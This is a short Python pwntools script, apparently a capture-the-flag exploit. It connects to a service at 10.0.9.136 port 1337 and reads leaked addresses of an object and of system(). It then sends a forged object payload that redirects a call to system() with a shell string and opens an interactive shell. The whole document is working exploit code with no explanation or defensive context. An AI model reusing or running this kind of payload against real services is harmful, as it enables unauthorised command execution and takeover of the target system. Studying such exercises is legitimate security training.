from pwn import *

r = remote('10.0.9.136', 1337)

r.recvuntil('0x')
addrof_obj = int(r.recv(12), 16)

r.recvuntil('0x')
system = int(r.recv(12), 16)

log.info(f'Address of obj: {hex(addrof_obj)}')
log.info(f'Address of system(): {hex(system)}')

length = 72
payload = b'.bin/sh\x00' + p64(addrof_obj - length) + p64(system) + b'\x00' * (length-24)

print(payload)
print(payload.hex())
print(payload.hex().encode())

r.recvuntil('fakeobj: ')
r.sendline(payload.hex())
r.interactive()